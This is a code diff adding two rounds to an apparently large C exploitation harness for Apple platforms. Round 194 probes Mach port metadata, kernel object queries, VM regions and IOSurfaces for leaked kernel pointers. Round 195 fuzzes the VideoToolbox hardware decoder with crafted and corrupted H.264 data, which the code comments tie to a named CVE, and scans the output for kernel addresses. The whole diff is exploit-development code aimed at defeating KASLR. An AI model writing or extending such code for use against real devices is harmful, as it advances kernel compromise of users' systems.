@@ -57,6 +57,9 @@
 #include <errno.h>
 #include <compression.h>
 #include <stdatomic.h>
+#include <arpa/inet.h>
+#include <libproc.h>
+#include <mach/mach_vm.h>
 
 extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);
 extern int proc_pidinfo(int pid, int flavor, uint64_t arg, void *buffer, int buffersize);
@@ -22492,6 +22495,562 @@ new_modes:
 
                 IOObjectRelease(svc193);
                 rlog("=== r=193 complete ===\n");
+            }
+
+            if (rounds == 194) {
+                /*
+                 * r=194: Mach port + VM introspection for KASLR leak.
+                 *
+                 * Deep scan of mach port metadata, VM region info,
+                 * and IOSurface object correlation for any kernel
+                 * address leak.
+                 */
+                rlog("=== r=194: Mach port + VM introspection ===\n");
+
+                /* Part A: mach_port introspection */
+                rlog("\n  --- Part A: Mach port metadata ---\n");
+
+                /* Create an IOSurface and get its mach port */
+                CFMutableDictionaryRef sp194 = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w194 = 64, h194 = 64, bpe194 = 4;
+                CFNumberRef wn194 = CFNumberCreate(NULL, kCFNumberIntType, &w194);
+                CFNumberRef hn194 = CFNumberCreate(NULL, kCFNumberIntType, &h194);
+                CFNumberRef bn194 = CFNumberCreate(NULL, kCFNumberIntType, &bpe194);
+                int pf194 = 0x42475241;
+                CFNumberRef pfn194 = CFNumberCreate(NULL, kCFNumberIntType, &pf194);
+                CFDictionarySetValue(sp194, CFSTR("IOSurfaceWidth"), wn194);
+                CFDictionarySetValue(sp194, CFSTR("IOSurfaceHeight"), hn194);
+                CFDictionarySetValue(sp194, CFSTR("IOSurfaceBytesPerElement"), bn194);
+                CFDictionarySetValue(sp194, CFSTR("IOSurfacePixelFormat"), pfn194);
+                IOSurfaceRef surf194 = IOSurfaceCreate(sp194);
+                IOSurfaceID sid194 = surf194 ? IOSurfaceGetID(surf194) : 0;
+                rlog("  Surface created: ID=%u ptr=%p\n", sid194, (void*)surf194);
+
+                if (surf194) {
+                    mach_port_t surfport = IOSurfaceCreateMachPort(surf194);
+                    rlog("  Mach port: 0x%x\n", surfport);
+
+                    /* mach_port_get_context */
+                    mach_port_context_t ctx194 = 0;
+                    kern_return_t kr_ctx = mach_port_get_context(mach_task_self(),
+                        surfport, &ctx194);
+                    rlog("  mach_port_get_context: kr=0x%x ctx=0x%llx\n",
+                         kr_ctx, (unsigned long long)ctx194);
+                    if (ctx194 > 0xFFFF) {
+                        uint64_t ut = (ctx194 & 0xF000FFFFFFFFFFFFULL) |
+                            ((ctx194 & 0x00F0000000000000ULL) ? 0xFFF0000000000000ULL : 0);
+                        if ((ut & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                            rlog("  *** KPTR in context: 0x%llx ***\n",
+                                 (unsigned long long)ctx194);
+                        }
+                    }
+
+                    /* mach_port_get_attributes - various flavors */
+                    int flavors194[] = {
+                        1,  /* MACH_PORT_LIMITS_INFO */
+                        2,  /* MACH_PORT_RECEIVE_STATUS */
+                        3,  /* MACH_PORT_DNREQUESTS_SIZE */
+                        5,  /* MACH_PORT_INFO_EXT */
+                        6,  /* MACH_PORT_GUARD_INFO */
+                        7,  /* MACH_PORT_SERVICE_THROTTLE_INFO */
+                    };
+                    for (int fi = 0; fi < 6; fi++) {
+                        uint64_t info194[16];
+                        memset(info194, 0, sizeof(info194));
+                        mach_msg_type_number_t icnt = 16;
+                        kern_return_t kr_attr = mach_port_get_attributes(
+                            mach_task_self(), surfport,
+                            flavors194[fi], (mach_port_info_t)info194, &icnt);
+                        if (kr_attr == KERN_SUCCESS && icnt > 0) {
+                            rlog("  port_attr[%d] cnt=%u:", flavors194[fi], icnt);
+                            for (mach_msg_type_number_t qi = 0; qi < icnt && qi < 8; qi++) {
+                                uint32_t *w = (uint32_t*)info194;
+                                if (w[qi] != 0) rlog(" [%u]=0x%x", qi, w[qi]);
+                            }
+                            rlog("\n");
+                            /* Check for KPTR in raw data */
+                            for (mach_msg_type_number_t qi = 0; qi + 1 < icnt; qi += 2) {
+                                uint32_t *w = (uint32_t*)info194;
+                                uint64_t v = ((uint64_t)w[qi+1] << 32) | w[qi];
+                                uint64_t ut = (v & 0xF000FFFFFFFFFFFFULL) |
+                                    ((v & 0x00F0000000000000ULL) ? 0xFFF0000000000000ULL : 0);
+                                if ((ut & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                    rlog("  *** KPTR in attr[%d]: 0x%016llx ***\n",
+                                         flavors194[fi], (unsigned long long)v);
+                                }
+                            }
+                        } else if (kr_attr != KERN_SUCCESS) {
+                            rlog("  port_attr[%d]: kr=0x%x\n", flavors194[fi], kr_attr);
+                        }
+                    }
+
+                    /* mach_port_kernel_object */
+                    rlog("\n  mach_port_kernel_object:\n");
+                    unsigned int kotype194 = 0;
+                    unsigned int koaddr194 = 0;
+                    kern_return_t kr_ko = mach_port_kernel_object(
+                        mach_task_self(), surfport, &kotype194, &koaddr194);
+                    rlog("  kernel_object: kr=0x%x type=%u addr=0x%x\n",
+                         kr_ko, kotype194, koaddr194);
+
+                    /* mach_port_kobject_description */
+                    mach_port_t tport = mach_task_self();
+                    rlog("  task_self port: 0x%x\n", tport);
+                    /* Try kobject on task port */
+                    unsigned int tko_type = 0, tko_addr = 0;
+                    kern_return_t kr_tko = mach_port_kernel_object(
+                        mach_task_self(), tport, &tko_type, &tko_addr);
+                    rlog("  task kobject: kr=0x%x type=%u addr=0x%x\n",
+                         kr_tko, tko_type, tko_addr);
+
+                    /* Try on host port */
+                    mach_port_t hport = mach_host_self();
+                    unsigned int hko_type = 0, hko_addr = 0;
+                    kern_return_t kr_hko = mach_port_kernel_object(
+                        mach_task_self(), hport, &hko_type, &hko_addr);
+                    rlog("  host kobject: kr=0x%x type=%u addr=0x%x\n",
+                         kr_hko, hko_type, hko_addr);
+
+                    mach_port_deallocate(mach_task_self(), surfport);
+                }
+
+                /* Part B: VM region info on IOSurface mapping */
+                rlog("\n  --- Part B: VM region introspection ---\n");
+                if (surf194) {
+                    IOSurfaceLock(surf194, kIOSurfaceLockReadOnly, NULL);
+                    void *base194 = IOSurfaceGetBaseAddress(surf194);
+                    size_t alloc194 = IOSurfaceGetAllocSize(surf194);
+                    IOSurfaceUnlock(surf194, kIOSurfaceLockReadOnly, NULL);
+                    rlog("  Base address: %p, alloc size: %zu\n",
+                         base194, alloc194);
+
+                    /* vm_region_recurse on the mapping */
+                    mach_vm_address_t addr194 = (mach_vm_address_t)base194;
+                    mach_vm_size_t size194 = 0;
+                    uint32_t depth194 = 0;
+                    vm_region_submap_info_data_64_t vinfo194;
+                    mach_msg_type_number_t vcnt194 = VM_REGION_SUBMAP_INFO_COUNT_64;
+                    kern_return_t kr_vm = mach_vm_region_recurse(
+                        mach_task_self(), &addr194, &size194, &depth194,
+                        (vm_region_recurse_info_t)&vinfo194, &vcnt194);
+                    rlog("  vm_region_recurse: kr=0x%x addr=0x%llx size=0x%llx depth=%u\n",
+                         kr_vm, (unsigned long long)addr194,
+                         (unsigned long long)size194, depth194);
+                    if (kr_vm == KERN_SUCCESS) {
+                        rlog("  prot=%d/%d offset=0x%llx behavior=%d\n",
+                             vinfo194.protection, vinfo194.max_protection,
+                             (unsigned long long)vinfo194.offset,
+                             vinfo194.behavior);
+                        rlog("  user_tag=%d pages_resident=%u share_mode=%d\n",
+                             vinfo194.user_tag, vinfo194.pages_resident,
+                             vinfo194.share_mode);
+                        rlog("  object_id=0x%x external_pager=%d\n",
+                             vinfo194.object_id, vinfo194.external_pager);
+                        uint64_t oid = (uint64_t)vinfo194.object_id;
+                        uint64_t ut = (oid & 0xF000FFFFFFFFFFFFULL) |
+                            ((oid & 0x00F0000000000000ULL) ? 0xFFF0000000000000ULL : 0);
+                        if ((ut & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL)
+                            rlog("  *** KPTR in object_id! ***\n");
+                    }
+
+                    /* Also check mach_vm_region (non-recurse) */
+                    mach_vm_address_t addr194b = (mach_vm_address_t)base194;
+                    mach_vm_size_t size194b = 0;
+                    vm_region_basic_info_data_64_t binfo194;
+                    mach_msg_type_number_t bcnt194 = VM_REGION_BASIC_INFO_COUNT_64;
+                    mach_port_t objname194 = MACH_PORT_NULL;
+                    kern_return_t kr_vm2 = mach_vm_region(mach_task_self(),
+                        &addr194b, &size194b, VM_REGION_BASIC_INFO_64,
+                        (vm_region_info_t)&binfo194, &bcnt194, &objname194);
+                    rlog("  mach_vm_region: kr=0x%x objname=0x%x\n",
+                         kr_vm2, objname194);
+                    if (objname194 != MACH_PORT_NULL) {
+                        rlog("  Got object name port!\n");
+                        mach_port_context_t oc = 0;
+                        mach_port_get_context(mach_task_self(), objname194, &oc);
+                        rlog("  Object port context: 0x%llx\n",
+                             (unsigned long long)oc);
+                        mach_port_deallocate(mach_task_self(), objname194);
+                    }
+
+                    /* Extended info */
+                    mach_vm_address_t addr194c = (mach_vm_address_t)base194;
+                    mach_vm_size_t size194c = 0;
+                    vm_region_extended_info_data_t einfo194;
+                    mach_msg_type_number_t ecnt194 = VM_REGION_EXTENDED_INFO_COUNT;
+                    mach_port_t eobj194 = MACH_PORT_NULL;
+                    kern_return_t kr_vm3 = mach_vm_region(mach_task_self(),
+                        &addr194c, &size194c, VM_REGION_EXTENDED_INFO,
+                        (vm_region_info_t)&einfo194, &ecnt194, &eobj194);
+                    rlog("  vm_extended: kr=0x%x ref=%u share=%u\n",
+                         kr_vm3,
+                         kr_vm3 == KERN_SUCCESS ? einfo194.ref_count : 0,
+                         kr_vm3 == KERN_SUCCESS ? einfo194.share_mode : 0);
+                }
+
+                /* Part C: IOSurface ID allocation pattern analysis */
+                rlog("\n  --- Part C: IOSurface ID pattern ---\n");
+                IOSurfaceRef surfs194[8];
+                for (int i = 0; i < 8; i++) {
+                    surfs194[i] = IOSurfaceCreate(sp194);
+                    if (surfs194[i]) {
+                        IOSurfaceID sid = IOSurfaceGetID(surfs194[i]);
+                        void *ba = IOSurfaceGetBaseAddress(surfs194[i]);
+                        size_t as = IOSurfaceGetAllocSize(surfs194[i]);
+                        rlog("  Surf[%d] ID=%u base=%p alloc=%zu\n",
+                             i, sid, ba, as);
+                    }
+                }
+                /* Check if base addresses have predictable pattern */
+                for (int i = 0; i < 8; i++) {
+                    if (surfs194[i]) CFRelease(surfs194[i]);
+                }
+
+                /* Part D: proc_pidinfo / proc_regionfilename */
+                rlog("\n  --- Part D: proc_regionfilename ---\n");
+                if (surf194) {
+                    void *base194d = IOSurfaceGetBaseAddress(surf194);
+                    char pathbuf194[1024] = {0};
+                    int pret = proc_regionfilename(getpid(),
+                        (uint64_t)base194d, pathbuf194, sizeof(pathbuf194));
+                    rlog("  proc_regionfilename: ret=%d path='%s'\n",
+                         pret, pathbuf194);
+                }
+
+                /* Part E: IOSurface seed monitoring */
+                rlog("\n  --- Part E: IOSurface seed ---\n");
+                if (surf194) {
+                    uint32_t seed1 = IOSurfaceGetSeed(surf194);
+                    rlog("  Seed before write: %u (0x%x)\n", seed1, seed1);
+
+                    IOSurfaceLock(surf194, 0, NULL);
+                    uint32_t *px = IOSurfaceGetBaseAddress(surf194);
+                    if (px) px[0] = 0xDEAD;
+                    IOSurfaceUnlock(surf194, 0, NULL);
+
+                    uint32_t seed2 = IOSurfaceGetSeed(surf194);
+                    rlog("  Seed after write: %u (0x%x) delta=%d\n",
+                         seed2, seed2, seed2 - seed1);
+                }
+
+                if (surf194) CFRelease(surf194);
+                CFRelease(sp194);
+                CFRelease(wn194); CFRelease(hn194); CFRelease(bn194); CFRelease(pfn194);
+                rlog("=== r=194 complete ===\n");
+            }
+
+            if (rounds == 195) {
+                /*
+                 * r=195: VideoToolbox hardware decode deep fuzzer.
+                 *
+                 * Target CVE-2026-112466 (AVE2 OOB read → KASLR leak).
+                 * Force hardware decode path and probe error return values,
+                 * pixel buffer metadata, and CMSampleBuffer properties
+                 * for leaked kernel addresses.
+                 */
+                rlog("=== r=195: VideoToolbox HW decode fuzzer ===\n");
+
+                /* Minimal valid H.264 SPS+PPS+IDR for hardware decode */
+                static const uint8_t sps195[] = {
+                    0x67, 0x42, 0xc0, 0x1e, 0xd9, 0x00, 0xa0, 0x47, 0xfe, 0xc8
+                };
+                static const uint8_t pps195[] = {
+                    0x68, 0xce, 0x38, 0x80
+                };
+                static const uint8_t idr195[] = {
+                    0x65, 0x88, 0x80, 0x40, 0x00, 0x00, 0x00, 0x01,
+                    0x00, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x03,
+                    0x00, 0x02, 0x00, 0x00, 0x03, 0x00, 0x04, 0x00,
+                    0x00, 0x03, 0x00, 0x08, 0x00, 0x00, 0x03, 0x00,
+                    0x10, 0xa8
+                };
+
+                const uint8_t *psets[2] = {sps195, pps195};
+                size_t psizes[2] = {sizeof(sps195), sizeof(pps195)};
+                CMFormatDescriptionRef fmt195 = NULL;
+                OSStatus st195 = CMVideoFormatDescriptionCreateFromH264ParameterSets(
+                    NULL, 2, psets, psizes, 4, &fmt195);
+                rlog("  Format desc create: st=%d\n", (int)st195);
+
+                if (st195 == 0 && fmt195) {
+                    /* Test multiple decoder configurations */
+                    int configs[][2] = {
+                        {0, 0},     /* default */
+                        {1, 0},     /* force HW */
+                        {0, 1},     /* with realtime */
+                    };
+
+                    for (int ci = 0; ci < 3; ci++) {
+                        rlog("\n  Config %d (hw=%d rt=%d):\n",
+                             ci, configs[ci][0], configs[ci][1]);
+
+                        CFMutableDictionaryRef decoderSpec = CFDictionaryCreateMutable(
+                            NULL, 0, &kCFTypeDictionaryKeyCallBacks,
+                            &kCFTypeDictionaryValueCallBacks);
+                        if (configs[ci][0]) {
+                            /* Force hardware acceleration */
+                            CFDictionarySetValue(decoderSpec,
+                                CFSTR("EnableHardwareAcceleratedVideoDecoder"),
+                                kCFBooleanTrue);
+                            CFDictionarySetValue(decoderSpec,
+                                CFSTR("RequireHardwareAcceleratedVideoDecoder"),
+                                kCFBooleanTrue);
+                        }
+                        if (configs[ci][1]) {
+                            CFDictionarySetValue(decoderSpec,
+                                CFSTR("RealTime"), kCFBooleanTrue);
+                        }
+
+                        /* Pixel buffer attributes */
+                        CFMutableDictionaryRef pbattrs = CFDictionaryCreateMutable(
+                            NULL, 0, &kCFTypeDictionaryKeyCallBacks,
+                            &kCFTypeDictionaryValueCallBacks);
+                        int pbfmt = kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange;
+                        CFNumberRef pbfmtn = CFNumberCreate(NULL, kCFNumberIntType, &pbfmt);
+                        CFDictionarySetValue(pbattrs,
+                            kCVPixelBufferPixelFormatTypeKey, pbfmtn);
+
+                        /* Use callback that captures output */
+                        __block CVPixelBufferRef captured_pb = NULL;
+                        __block int decode_status = -999;
+
+                        VTDecompressionOutputCallbackRecord cb195;
+                        cb195.decompressionOutputCallback = NULL;
+                        cb195.decompressionOutputRefCon = NULL;
+
+                        /* Use synchronous decode with VTDecompressionSessionDecodeFrameWithOutputHandler */
+                        VTDecompressionSessionRef session195 = NULL;
+                        OSStatus st_create = VTDecompressionSessionCreate(
+                            NULL, fmt195, decoderSpec, pbattrs,
+                            NULL, &session195);
+                        rlog("  Session create: st=%d sess=%p\n",
+                             (int)st_create, (void*)session195);
+
+                        if (st_create == 0 && session195) {
+                            /* Build CMSampleBuffer from IDR */
+                            CMBlockBufferRef bb195 = NULL;
+                            uint8_t *idr_buf = malloc(4 + sizeof(idr195));
+                            uint32_t nallen = htonl(sizeof(idr195));
+                            memcpy(idr_buf, &nallen, 4);
+                            memcpy(idr_buf + 4, idr195, sizeof(idr195));
+                            size_t total_sz = 4 + sizeof(idr195);
+
+                            CMBlockBufferCreateWithMemoryBlock(
+                                NULL, idr_buf, total_sz, kCFAllocatorNull,
+                                NULL, 0, total_sz, 0, &bb195);
+
+                            CMSampleTimingInfo timing195 = {
+                                .duration = CMTimeMake(1, 30),
+                                .presentationTimeStamp = CMTimeMake(0, 30),
+                                .decodeTimeStamp = kCMTimeInvalid
+                            };
+                            size_t sampleSize = total_sz;
+                            CMSampleBufferRef sb195 = NULL;
+                            CMSampleBufferCreateReady(NULL, bb195, fmt195,
+                                1, 1, &timing195, 1, &sampleSize, &sb195);
+
+                            if (sb195) {
+                                /* Decode with output handler */
+                                __block CVPixelBufferRef out_pb = NULL;
+                                __block OSStatus out_st = -999;
+                                __block VTDecodeInfoFlags out_flags = 0;
+
+                                OSStatus dec_st =
+                                    VTDecompressionSessionDecodeFrameWithOutputHandler(
+                                        session195, sb195,
+                                        kVTDecodeFrame_1xRealTimePlayback,
+                                        NULL, ^(OSStatus status,
+                                                VTDecodeInfoFlags infoFlags,
+                                                CVImageBufferRef imageBuffer,
+                                                CMTime pts, CMTime duration) {
+                                    out_st = status;
+                                    out_flags = infoFlags;
+                                    if (imageBuffer) {
+                                        out_pb = (CVPixelBufferRef)CFRetain(imageBuffer);
+                                    }
+                                });
+                                rlog("  Decode submit: st=%d\n", (int)dec_st);
+
+                                VTDecompressionSessionWaitForAsynchronousFrames(session195);
+                                rlog("  Callback: st=%d flags=0x%x pb=%p\n",
+                                     (int)out_st, (unsigned)out_flags,
+                                     (void*)out_pb);
+
+                                if (out_pb) {
+                                    CVPixelBufferLockBaseAddress(out_pb, kCVPixelBufferLock_ReadOnly);
+                                    size_t pw = CVPixelBufferGetWidth(out_pb);
+                                    size_t ph = CVPixelBufferGetHeight(out_pb);
+                                    size_t pbr = CVPixelBufferGetBytesPerRow(out_pb);
+                                    void *pba = CVPixelBufferGetBaseAddress(out_pb);
+                                    rlog("  PB: %zux%zu bpr=%zu base=%p\n",
+                                         pw, ph, pbr, pba);
+
+                                    /* Scan pixel data for KPTR */
+                                    if (pba) {
+                                        uint64_t *scan = (uint64_t*)pba;
+                                        size_t nqw = (pbr * ph) / 8;
+                                        int kptr_count = 0;
+                                        for (size_t q = 0; q < nqw && q < 4096; q++) {
+                                            uint64_t v = scan[q];
+                                            uint64_t ut = (v & 0xF000FFFFFFFFFFFFULL) |
+                                                ((v & 0x00F0000000000000ULL) ?
+                                                 0xFFF0000000000000ULL : 0);
+                                            if ((ut & 0xFFFFFF0000000000ULL) ==
+                                                0xFFFFFE0000000000ULL) {
+                                                rlog("  *** KPTR@%zu: 0x%016llx ***\n",
+                                                     q*8, (unsigned long long)v);
+                                                kptr_count++;
+                                                if (kptr_count >= 10) break;
+                                            }
+                                        }
+                                        if (kptr_count == 0)
+                                            rlog("  Pixel scan: 0 KPTRs in %zu qwords\n",
+                                                 nqw > 4096 ? (size_t)4096 : nqw);
+                                    }
+
+                                    /* Check pixel buffer IOSurface backing */
+                                    IOSurfaceRef pb_surf = CVPixelBufferGetIOSurface(out_pb);
+                                    if (pb_surf) {
+                                        IOSurfaceID pbsid = IOSurfaceGetID(pb_surf);
+                                        rlog("  PB IOSurface ID: %u\n", pbsid);
+
+                                        CFDictionaryRef pball =
+                                            IOSurfaceCopyAllValues(pb_surf);
+                                        if (pball) {
+                                            CFIndex nk = CFDictionaryGetCount(pball);
+                                            rlog("  PB Surface AllValues: %ld keys\n",
+                                                 (long)nk);
+                                            const void **pkeys = malloc(nk * sizeof(void*));
+                                            const void **pvals = malloc(nk * sizeof(void*));
+                                            CFDictionaryGetKeysAndValues(pball, pkeys, pvals);
+                                            for (CFIndex k = 0; k < nk && k < 32; k++) {
+                                                char kb[128] = {0};
+                                                if (CFGetTypeID(pkeys[k]) == CFStringGetTypeID())
+                                                    CFStringGetCString(pkeys[k], kb,
+                                                        sizeof(kb), kCFStringEncodingUTF8);
+                                                if (CFGetTypeID(pvals[k]) == CFNumberGetTypeID()) {
+                                                    int64_t nv = 0;
+                                                    CFNumberGetValue(pvals[k],
+                                                        kCFNumberSInt64Type, &nv);
+                                                    uint64_t uv = (uint64_t)nv;
+                                                    uint64_t uut = (uv & 0xF000FFFFFFFFFFFFULL) |
+                                                        ((uv & 0x00F0000000000000ULL) ?
+                                                         0xFFF0000000000000ULL : 0);
+                                                    if ((uut & 0xFFFFFF0000000000ULL) ==
+                                                        0xFFFFFE0000000000ULL) {
+                                                        rlog("  *** PB KPTR '%s'=0x%016llx ***\n",
+                                                             kb, (unsigned long long)uv);
+                                                    }
+                                                }
+                                            }
+                                            free(pkeys);
+                                            free(pvals);
+                                            CFRelease(pball);
+                                        }
+                                    }
+
+                                    CVPixelBufferUnlockBaseAddress(out_pb, kCVPixelBufferLock_ReadOnly);
+                                    CFRelease(out_pb);
+                                }
+
+                                CFRelease(sb195);
+                            }
+                            free(idr_buf);
+                            if (bb195) CFRelease(bb195);
+
+                            /* Also try decoding with CORRUPT SPS to trigger error paths */
+                            rlog("\n  Corrupt SPS decode attempts:\n");
+                            for (int mut = 0; mut < 5; mut++) {
+                                uint8_t msps[sizeof(sps195)];
+                                memcpy(msps, sps195, sizeof(sps195));
+                                /* Corrupt different bytes */
+                                msps[mut + 2] ^= 0xFF;
+
+                                const uint8_t *mp[2] = {msps, pps195};
+                                CMFormatDescriptionRef mfmt = NULL;
+                                OSStatus mst = CMVideoFormatDescriptionCreateFromH264ParameterSets(
+                                    NULL, 2, mp, psizes, 4, &mfmt);
+                                if (mst == 0 && mfmt) {
+                                    VTDecompressionSessionRef ms = NULL;
+                                    OSStatus mcs = VTDecompressionSessionCreate(
+                                        NULL, mfmt, decoderSpec, pbattrs,
+                                        NULL, &ms);
+                                    rlog("  Mut[%d] byte %d: fmt=%d sess=%d\n",
+                                         mut, mut+2, (int)mst, (int)mcs);
+
+                                    if (mcs == 0 && ms) {
+                                        /* Try decode and check error */
+                                        CMBlockBufferRef mbb = NULL;
+                                        uint8_t *mbuf = malloc(total_sz);
+                                        memcpy(mbuf, &nallen, 4);
+                                        memcpy(mbuf + 4, idr195, sizeof(idr195));
+                                        CMBlockBufferCreateWithMemoryBlock(
+                                            NULL, mbuf, total_sz, kCFAllocatorNull,
+                                            NULL, 0, total_sz, 0, &mbb);
+                                        CMSampleBufferRef msb = NULL;
+                                        CMSampleBufferCreateReady(NULL, mbb, mfmt,
+                                            1, 1, &timing195, 1, &sampleSize, &msb);
+                                        if (msb) {
+                                            __block OSStatus mout_st = -999;
+                                            __block CVPixelBufferRef mout_pb = NULL;
+                                            VTDecompressionSessionDecodeFrameWithOutputHandler(
+                                                ms, msb, 0, NULL,
+                                                ^(OSStatus s, VTDecodeInfoFlags f,
+                                                  CVImageBufferRef ib, CMTime p, CMTime d) {
+                                                mout_st = s;
+                                                if (ib) mout_pb = (CVPixelBufferRef)CFRetain(ib);
+                                            });
+                                            VTDecompressionSessionWaitForAsynchronousFrames(ms);
+                                            rlog("  Mut[%d] decode: st=%d pb=%p\n",
+                                                 mut, (int)mout_st, (void*)mout_pb);
+                                            if (mout_pb) {
+                                                /* Check for KPTR in output */
+                                                CVPixelBufferLockBaseAddress(mout_pb,
+                                                    kCVPixelBufferLock_ReadOnly);
+                                                void *mba = CVPixelBufferGetBaseAddress(mout_pb);
+                                                if (mba) {
+                                                    uint64_t *ms64 = (uint64_t*)mba;
+                                                    size_t mnq = CVPixelBufferGetBytesPerRow(mout_pb)
+                                                        * CVPixelBufferGetHeight(mout_pb) / 8;
+                                                    for (size_t q = 0; q < mnq && q < 1024; q++) {
+                                                        uint64_t v = ms64[q];
+                                                        uint64_t uut = (v & 0xF000FFFFFFFFFFFFULL) |
+                                                            ((v & 0x00F0000000000000ULL) ?
+                                                             0xFFF0000000000000ULL : 0);
+                                                        if ((uut & 0xFFFFFF0000000000ULL) ==
+                                                            0xFFFFFE0000000000ULL) {
+                                                            rlog("  *** MUT KPTR@%zu: 0x%016llx ***\n",
+                                                                 q*8, (unsigned long long)v);
+                                                        }
+                                                    }
+                                                }
+                                                CVPixelBufferUnlockBaseAddress(mout_pb,
+                                                    kCVPixelBufferLock_ReadOnly);
+                                                CFRelease(mout_pb);
+                                            }
+                                            CFRelease(msb);
+                                        }
+                                        free(mbuf);
+                                        if (mbb) CFRelease(mbb);
+                                        VTDecompressionSessionInvalidate(ms);
+                                        CFRelease(ms);
+                                    }
+                                    CFRelease(mfmt);
+                                }
+                            }
+
+                            VTDecompressionSessionInvalidate(session195);
+                            CFRelease(session195);
+                        }
+
+                        CFRelease(decoderSpec);
+                        CFRelease(pbattrs);
+                        CFRelease(pbfmtn);
+                    }
+                    CFRelease(fmt195);
+                }
+                rlog("=== r=195 complete ===\n");
             }
 
             IOServiceClose(conn17);
